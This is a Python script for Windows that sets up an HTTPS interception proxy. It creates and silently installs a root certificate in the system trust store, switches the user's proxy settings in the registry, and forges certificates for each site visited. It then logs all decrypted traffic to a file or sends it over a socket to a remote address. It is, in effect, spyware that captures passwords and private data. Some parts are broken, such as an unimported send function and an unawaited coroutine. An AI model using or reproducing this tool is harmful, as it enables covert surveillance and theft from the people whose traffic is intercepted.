from __future__ import annotations
from consts import *
import os
import random
import ssl
from typing import Tuple, Optional, Union, TextIO
from mitm import MITM, middleware, Connection, protocol, crypto, __data__
from mitm.crypto import new_RSA
from mitm.crypto import crypto as cr
# from network import send
from socket import socket
from threading import Thread
# import sys
import winreg
from asyncio import CancelledError
import pathlib
# import certifi
from OpenSSL import crypto as cry

my_socket: Optional[socket] = None
file: Optional[TextIO] = None
mitm: Optional[MITM] = None

installed_hosts = {}


def new_X509(
    country_name: str = "US",
    state_or_province_name: str = "New York",
    locality: str = "New York",
    organization_name: str = "mitm",
    organization_unit_name: str = "mitm",
    common_name: str = "what",
    serial_number: int = random.getrandbits(1024),
    time_not_before: int = 0,  # 0 means now.
    time_not_after: int = 5 * (365 * 24 * 60 * 60),  # 5 year.
) -> cr.X509:
    """
    Generates a non-signed X509 certificate.

    This function is intended to be utilized with :py:func:`new_RSA`. See function
    :py:func:`new_pair` to understand how to generate a valid RSA and X509 pair for
    SSL/TLS use.

    Args:
        country_name: Country name code. Defaults to ``US``.
        state_or_province_name: State or province name. Defaults to ``New York``.
        locality: Locality name. Can be any. Defaults to ``New York``.
        organization_name: Name of the org generating the cert. Defaults to ``mitm``.
        organization_unit_name: Name of the subunit of the org. Defaults to ``mitm``.
        common_name: Server name protected by the SSL cert. Defaults to hostname.
        serial_number: A unique serial number. Any number between 0 and 2^159-1. Defaults to random number.
        time_not_before: Time since cert is valid. 0 means now. Defaults to ``0``.
        time_not_after: Time when cert is no longer valid. Defaults to 5 years.
    """

    cert = cr.X509()
    #cert.set_version(3)
    cert.get_subject().C = country_name
    cert.get_subject().ST = state_or_province_name
    cert.get_subject().L = locality
    cert.get_subject().O = organization_name
    cert.get_subject().OU = organization_unit_name
    cert.get_subject().CN = common_name
    cert.set_serial_number(serial_number)
    cert.gmtime_adj_notBefore(time_not_before)
    cert.gmtime_adj_notAfter(time_not_after)
    cert.set_issuer(cert.get_subject())
    cert.get_issuer().CN = "someone"
    return cert

async def new_pair(
    host: str,
    key_path: Optional[pathlib.Path] = None,
    cert_path: Optional[pathlib.Path] = None,
) -> Tuple[bytes, bytes]:
    """
    Generates an RSA and self-signed X509 certificate for use with TLS/SSL.

    The X509 certificate is self-signed and is not signed by any other certificate
    authority, containing default values for its fields.

    Args:
        key_path: Optional path to save key.
        cert_path: Optional path to save cert.

    Returns:
        tuple: Key and certificate bytes ready to be saved.
    """
    print("11")
    rsa = new_RSA()
    print("12")
    cert = new_X509(common_name=host, organization_name="oops", organization_unit_name="oops")
    print("13")
    # Sets the certificate public key, and signs it.
    cert.set_pubkey(rsa)
    cert.sign(rsa, "sha256")
    print("14")
    # Dumps the .crt and .key files as bytes.
    key = cry.dump_privatekey(cry.FILETYPE_PEM, rsa)
    crt = cry.dump_certificate(cry.FILETYPE_PEM, cert)
    print("15")
    # Stores they .crt and .key file if specified.
    if key_path:
        key_path.parent.mkdir(parents=True, exist_ok=True)
        with key_path.open("wb") as file:
            file.write(key)
    if cert_path:
        cert_path.parent.mkdir(parents=True, exist_ok=True)
        with cert_path.open("wb") as file:
            file.write(crt)
    print("16")
    return key, crt


# async def create_crypto(host: str, connection=None) -> ssl.SSLContext:
#     print("1")
#     rsa_key, rsa_cert = __data__ / f"{host}.key", __data__ / f"{host}.crt"
#     print("2")
#     await new_pair(host, key_path=rsa_key, cert_path=rsa_cert)
#     print("3")
#     context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
#     print("4")
#     context.load_cert_chain(certfile=rsa_cert, keyfile=rsa_key)
#     if connection:
#         connection.ssl_context = context
#     print(rsa_cert)
#     install_cert(rsa_cert)
#     #os.remove(rsa_key)
#     #os.remove(rsa_cert)
#     installed_hosts[host] = context
#     return context


async def create_root(ca_path: str, country: str = "Is", state: str = PROJECT_NAME, organiztion: str = PROJECT_NAME, common_name=PROJECT_NAME):
    os.system(f'openssl genrsa -out "{ca_path}.key" 4096')
    os.system(f'openssl req -x509 -new -nodes -key "{ca_path}.key" -sha256 -days 1024 '
              f'-subj "/C={country}/ST={state}/O={organiztion}/CN={common_name}" -out "{ca_path}.crt"')
    os.system(f'certutil -addstore root "{ca_path}.crt"')


async def new_pair2(host: str, country: str = "Is", state: str = PROJECT_NAME, organiztion: str = PROJECT_NAME):
    ca_path = f"{ROOT_DIRECTORY}\\{ROOT_CA_NAME}"
    host_path = f"{ROOT_DIRECTORY}\\{host}"
    os.system(f'openssl genrsa -out "{host_path}.key" 2048')
    with open(f"{host_path}.conf", "wt") as f:
        f.write(f"[req]\n"
                f"default_bits = 2048\n"
                f"prompt = no\n"
                f"default_md = sha256\n"
                f"req_extensions = req_ext\n"
                f"distinguished_name = dn\n"
                f"[dn]\n"
                f"C = {country}\n"
                f"ST = {state}\n"
                f"O = {organiztion}\n"
                f"emailAddress = flikhamud123@gmail.com\n"
                f"CN = {host}\n"
                f"[req_ext]\n"
                f"subjectAltName = @alt_names\n"
                f"[alt_names]\n"
                f"DNS.1 = {host}")
    os.system(f'openssl req -new -sha256 -key "{host_path}.key" '
              f'-subj "/C={country}/ST={state}/O={organiztion}/CN={host}" '
              f'-config "{host_path}.conf" '
              f'-out "{host_path}.csr"')
    #os.system(f"openssl req -in {host}.csr -noout -text")
    os.system(f'openssl x509 -req -in "{host_path}.csr" '
              f'-extfile "{host_path}.conf" -extensions req_ext'
              f' -CA "{ca_path}.crt" -CAkey "{ca_path}.key" -CAcreateserial -out "{host_path}.crt" -days 500 -sha256')
    #os.system(f"openssl x509 -in {host}.crt -text -noout")


async def create_crypto2(host: str):
    a = await new_pair2(host)
    print(a)
    context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
    context.load_cert_chain(certfile=f"{ROOT_DIRECTORY}\\{host}.crt", keyfile=f"{ROOT_DIRECTORY}\\{host}.key")
    install_cert(f"{ROOT_DIRECTORY}\\{host}.crt")
    #os.remove(rsa_key)
    #os.remove(rsa_cert)
    installed_hosts[host] = context


async def start_connection(connection: Connection, data):
    #print("what")
    if b"CONNECT" in data:
        print("whatttt")
        host = str(data[data.find(b" ")+1: data.find(b":")])[2:-1]
        print("OK")
    else:
        return
    #print("Wow")
    if host not in installed_hosts:
        await create_crypto2(host)
    connection.ssl_context = installed_hosts[host]


class HttpsLogger(middleware.Middleware):
    @classmethod
    async def mitm_started(cls, host: str, port: int):
        await cls.write(f"MITM started on {host}:{port}.\n")
        print("MITM started on %s:%d.\n" % (host, port))
        await create_root(f"{ROOT_DIRECTORY}\\{ROOT_CA_NAME}")

    @classmethod
    async def client_connected(cls, connection: Connection):
        host, port = connection.client.writer._transport.get_extra_info("peername")
        await cls.write(f"Client {host}:{port} has connected.\n")
        print("Client %s:%i has connected.\n" % (host, port))

    @classmethod
    async def server_connected(cls, connection: Connection):
        host, port = connection.server.writer._transport.get_extra_info("peername")
        await cls.write(f"Connected to server {host}:{port}.\n")
        print("Connected to server %s:%i.\n" % (host, port))

    @classmethod
    async def client_data(cls, connection: Connection, data: bytes) -> bytes:
        await cls.write(f"Client to server: \n\n\t{data}\n")
        print("Client to server: \n\n\t%s\n" % data)
        await start_connection(connection, data)
        return data

    @classmethod
    async def server_data(cls, connection: Connection, data: bytes) -> bytes:
        await cls.write(f"Server to client: \n\n\t{data}\n")
        print("Server to client: \n\n\t%s\n" % data)
        return data

    @classmethod
    async def client_disconnected(cls, connection: Connection):
        await cls.write("Client has disconnected.\n")
        # print("Client has disconnected.\n")

    @classmethod
    async def server_disconnected(cls, connection: Connection):
        await cls.write("Server has disconnected.")
        # print("Server has disconnected.")

    @staticmethod
    async def write(info: str):
        raise NotImplementedError


class FileLog(HttpsLogger):
    @staticmethod
    async def write(info: str):
        file.write(info)


class NetLog(HttpsLogger):
    @staticmethod
    async def write(info: str):
        send(info, my_socket)


def set_reg(name, value, size):
    try:
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Internet Settings", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, name, 0, size, value)
        winreg.CloseKey(registry_key)
        return True
    except WindowsError as e:
        print(e)
        return False


def install_cert(host: str | None = None):
    if not host:
        return
    path = __data__.joinpath(f"mitm.crt") if not host else host
    os.system(f"powershell -c Import-Certificate -FilePath '{path}' -CertStoreLocation Cert:\LocalMachine\Root")


def filestart(path: str) -> bool:
    global file
    if file or my_socket:
        return False
    file = open(path, "wt")
    t = Thread(target=__start)
    t.start()
    # install_cert()
    return True


def netstart(address: Tuple[str, int]) -> bool:
    global my_socket
    if file or my_socket:
        return False
    my_socket = socket()
    my_socket.connect(address)
    t = Thread(target=__start)
    t.start()
    return True


def __start() -> bool:
    global mitm
    if my_socket and file:
        return False
    logger: Optional[type(middleware.Middleware)] = None
    if my_socket:
        logger = NetLog
    elif file:
        logger = FileLog
    else:
        return False

    #os.system('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1')
    #sys.stdout.write("yes")
    if not set_reg("ProxyEnable", 1, winreg.REG_DWORD):
        return False
    #os.system('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d 127.0.0.1:8888')
    #sys.stdout.write("yes")
    if not set_reg("ProxyServer", "127.0.0.1:8880", winreg.REG_SZ):
        return False
    mitm = MITM(middlewares=[logger],
                host="127.0.0.1",
                port=8880,
                protocols=[protocol.HTTP],
                buffer_size=8192,
                timeout=5,
                ssl_context=create_crypto2("google.com"))
    crypto.mitm_ssl_default_context()
    #install_cert()
    try:
        mitm.run()
    except CancelledError:
        print("Wow")
    return True


def stop_sniffing() -> bool:
    global my_socket, file
    if not mitm:
        return False
    mitm.stop()
    if my_socket:
        my_socket.close()
    if file:
        file.close()
    my_socket = None
    file = None
    #os.system('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 0')
    #sys.stdout.write("yes")
    set_reg("ProxyEnable", 0, winreg.REG_DWORD)
    return True


if __name__ == "__main__":
    filestart("logger.txt")
    print("started")
    # input()
    # # time.sleep(3)
    # stop_sniffing()
    # print("stopped")
